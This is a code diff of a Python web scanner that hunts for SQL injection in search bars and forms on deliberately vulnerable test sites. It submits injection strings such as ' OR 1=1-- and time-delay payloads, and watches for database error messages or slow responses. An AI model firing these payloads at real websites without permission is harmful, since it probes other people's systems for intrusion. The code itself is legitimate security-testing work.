@@ -8,6 +8,7 @@ import time
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
+import sqlmapchecker
 
 
 def find_search_bar(browser, url, method):
@@ -64,19 +65,36 @@ def try_find_search_bar(browser, method, value):
         try:
             search_bar.send_keys("Test")
             search_bar.clear()  # Clear the test input
-            print(f"Found interactable search bar using {method}='{value}'.")
+            # print(f"Found interactable search bar using {method}='{value}'.")
             return [search_bar, method, value]
         except ElementNotInteractableException:
-            print(f"Search bar found but not interactable using {method}='{value}'.")
+            # print(f"Search bar found but not interactable using {method}='{value}'.")
             return [None, None, None]
     except (NoSuchElementException, TimeoutException) as e:
-        print(f"Search bar not found using {method}='{value}'.")
+        # print(f"Search bar not found using {method}='{value}'.")
         # Reason: {e}")
         return [None, None, None]
 
 
-def test_sqli_payloads(browser, url):
-    # Categorize payloads into response-dependent and time-based
+def analyze_response(browser):
+    error_indicators = [
+        "you have an error in your sql syntax;",
+        "warning: mysql_fetch",
+        "unclosed quotation mark",
+        "microsoft ole db provider for sql server error '80040e14'",
+        "unclosed quotation mark after the character string",
+        "pg::syntaxerror",
+        "org.hibernate.exception.sqlgrammarexception:"
+    ]
+    page_source = browser.page_source.lower()
+    for error in error_indicators:
+        if error in page_source:
+            return True, "Potential SQL Injection vulnerability detected due to error message."
+    return False, "No clear vulnerability detected based on error message checks."
+
+
+def test_sqli_payloads(browser, url, search_bar):
+    # Define your payloads here
     response_dependent_payloads = [
         "' OR '1'='1",  # Simple and effective always true condition.
         "' OR 1=1--",  # Common always true condition with comment.
@@ -94,87 +112,58 @@ def test_sqli_payloads(browser, url):
     ]
 
     results = []
-    exceptions = []
+    found = False
 
-    # Function to analyze response for error messages
-    def analyze_response(browser):
-        error_indicators = [
-            "you have an error in your sql syntax;",
-            "warning: mysql_fetch",
-            "unclosed quotation mark",
-            "microsoft ole db provider for sql server error '80040e14'",
-            "unclosed quotation mark after the character string",
-            "pg::syntaxerror",
-            "org.hibernate.exception.sqlgrammarexception:"
-        ]
-        page_source = browser.page_source.lower()
-
-        for error in error_indicators:
-            if error in page_source:
-                return True, "Potential SQL Injection vulnerability detected due to error message."
-        return False, "No clear vulnerability detected based on error message checks."
-
-    method = []
-    search_bar = find_search_bar(browser, url, method)
-    method = [(search_bar[1], search_bar[2])]
-
-    # Handling response-dependent payloads
+    # Test response-dependent payloads
     for payload in response_dependent_payloads:
         try:
-            search_bar = find_search_bar(browser, url, method)[
-                0]  # Assuming find_search_bar returns a tuple with search_bar as the first element
-            if search_bar is None:
-                raise Exception("Search bar could not be found.")
             search_bar.clear()
             search_bar.send_keys(payload + Keys.ENTER)
             time.sleep(5)  # Adjust based on expected page load time
-            detected, result_message = analyze_response(browser)
+            vulnerable, result_message = analyze_response(browser)
             results.append((payload, result_message))
+            if vulnerable:
+                found = True
             browser.back()
-            time.sleep(2)  # Adjust based on your observation for navigation
+            time.sleep(2)  # Adjust for page navigation
         except Exception as e:
-            exceptions.append((payload, str(e)))
+            results.append((payload, str(e)))
 
-    # Handling time-based payloads
+    # Test time-based payloads
     for payload in time_based_payloads:
         try:
             start_time = time.time()
-            search_bar = find_search_bar(browser, url, method)[0]
-            if search_bar is None:
-                raise Exception("Search bar could not be found.")
             search_bar.clear()
             search_bar.send_keys(payload + Keys.ENTER)
             # Wait for a time longer than the expected delay to ensure detection
-            time.sleep(10)  # Example for payloads with around 5 seconds delay
+            time.sleep(50)  # Adjust based on the expected delay of the payload
             elapsed_time = time.time() - start_time
-            if elapsed_time - 45 > 3:  # Example threshold, adjust based on expected delay and acceptable variance
+            if elapsed_time - 45 > 3:  # Threshold for confirming delay
                 results.append((payload, "Potential SQL Injection vulnerability detected through time delay."))
+                found = True
             else:
                 results.append((payload, "No significant delay detected."))
             browser.back()
             time.sleep(2)
         except Exception as e:
-            exceptions.append((payload, str(e)))
+            results.append((payload, str(e)))
 
-    for payload, exception_message in exceptions:
-        print(f"Payload '{payload}': Exception - {exception_message}")
-
-    return results
+    return results, found
 
 
 def check_sqli_in_searchbar(url):
-    chrome_options = webdriver.ChromeOptions()
-    chrome_options.add_argument("--ignore-certificate-errors")
-    browser = webdriver.Chrome(options=chrome_options)
+    options = webdriver.ChromeOptions()
+    # Set up Chrome options...
+    browser = webdriver.Chrome(options=options)
 
     try:
-        search_bar = find_search_bar(browser, url, None)[0]
+        search_bar = find_search_bar(browser, url, None)[0]  # Assume find_search_bar is defined elsewhere
         if search_bar:
-            print("Success: Search bar found.")
-            results = test_sqli_payloads(browser, url)
-            print("\nSQL Injection Test Results:")
-            for payload, result in results:
-                print(f"Payload '{payload}': {result}")
+            results, found = test_sqli_payloads(browser, url, search_bar)
+            if found:
+                print("SQL Injection vulnerability detected")
+            else:
+                print("No SQL injection vulnerability detected.")
         else:
             print("Search bar not found.")
     except Exception as e:
@@ -224,7 +213,7 @@ def is_vulnerable(response):
 
 
 def scan_sql_injection(url, session):
-    print(f"Testing URL: {url}")
+    # print(f"Testing URL: {url}")
 
     # Test vulnerability in the URL
     if is_sql_injection_vulnerable_by_url(url, session):
@@ -234,7 +223,7 @@ def scan_sql_injection(url, session):
     try:
         response = session.get(url)
         forms = find_forms(response.text)
-        print(f"Found {len(forms)} forms on {url}.")
+        # print(f"Found {len(forms)} forms on {url}.")
         for form in forms:
             form_info = form_details(form)
             content_type = response.headers.get('Content-Type')
@@ -269,8 +258,87 @@ def is_sql_injection_vulnerable_by_url(url, session):
     return False
 
 
+# Initialize session
+s = requests.Session()
+s.headers[
+    "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
+
+
+def get_forms(url):
+    """ Retrieve all forms from the webpage """
+    try:
+        response = s.get(url)
+        response.raise_for_status()  # Check for HTTP request errors
+        soup = BeautifulSoup(response.content, "html.parser")
+        return soup.find_all("form")
+    except requests.RequestException as e:
+        print(f"Error fetching {url}: {e}")
+        return []
+
+
+def vulnerable(response):
+    """ Check if the response contains SQL error messages """
+    errors = {
+        "quoted string not properly terminated",
+        "unclosed quotation mark after the character string",
+        "you have an error in your SQL syntax"
+    }
+    content = response.content.decode().lower()
+    return any(error in content for error in errors)
+
+
+def sql_injection_scan(url):
+    """ Scan each form for SQL injection vulnerabilities """
+    forms = get_forms(url)
+    # print(f"[+] Detected {len(forms)} forms on {url}.")
+
+    for form in forms:
+        details = form_details(form)
+        for i in "\"'":
+            data = {}
+            for input_tag in details["inputs"]:
+                if input_tag["type"] == "hidden" or input_tag["value"]:
+                    data[input_tag['name']] = input_tag["value"] + i
+                elif input_tag["type"] != "submit":
+                    data[input_tag['name']] = f"test{i}"
+            target_url = urljoin(url, details["action"])
+            try:
+                if details["method"] == "post":
+                    res = s.post(target_url, data=data)
+                else:
+                    res = s.get(target_url, params=data)
+                if vulnerable(res):
+                    print(f"SQL injection vulnerability detected in form at {target_url}")
+                else:
+                    print("No SQL injection vulnerability detected.")
+            except requests.RequestException as e:
+                print(f"Request to {target_url} failed: {e}")
+
+
 if __name__ == '__main__':
-    test_url = "http://testphp.vulnweb.com/artists.php?artist=1"
+    """Selenium-Based Search Bar SQL Injection Test (check_sqli_in_searchbar):
+    Purpose: To detect SQL Injection vulnerabilities through a web page's search bar using automated browser interactions.
+    Method: Uses Selenium WebDriver to navigate the web page, identify a search bar, and inject SQL payloads. It checks for typical SQL error responses or unusual behaviors (like delays) that indicate SQL Injection vulnerabilities.
+    Payloads: Includes a mixture of straightforward SQL injection strings and time-based payloads to attempt both error-based and blind SQL Injection.
+    
+    Request-Based Form SQL Injection Test (scan_sql_injection):
+    Purpose: To evaluate forms found on the web page for SQL Injection vulnerabilities using HTTP requests.
+    Method: Fetches the web page, parses out forms, and sends modified form data with SQL injection payloads. It checks server responses for typical SQL error messages.
+    Details: It constructs data payloads by appending SQL injection prone characters to input values and posts back to the form's action URL to see if the server handles inputs safely.
+    
+    Independent Form SQL Injection Scan (sql_injection_scan):
+    Purpose: Similar to the previous, but possibly intended as a more focused or alternative approach to scan each form individually for SQL Injection vulnerabilities.
+    Method: This method again fetches forms from a given URL, modifies the inputs with SQL Injection strings, submits the forms, and checks for SQL error messages in the responses.
+    
+    External SQLMap Check (sqlmapchecker.is_vulnerable_to_sqli):
+    Purpose: To use an external tool or module, presumably named sqlmapchecker, which could be an abstraction over the popular SQLMap tool used for detecting and exploiting SQL Injection flaws.
+    Method: This likely sends various types of SQL injection payloads through the given URL and observes the responses, leveraging SQLMap's extensive database and techniques for SQL Injection."""
+
+    test_url = ["http://testphp.vulnweb.com/artists.php?artist=1",
+                "https://demo.testfire.net"]
+
     session = request_session()
-    scan_sql_injection(test_url, session)
-    check_sqli_in_searchbar(test_url)
+    sql_injection_scan(test_url[0])
+    scan_sql_injection(test_url[0], session)
+    check_sqli_in_searchbar(test_url[0])
+    sqlmapchecker.is_vulnerable_to_sqli(test_url[0])
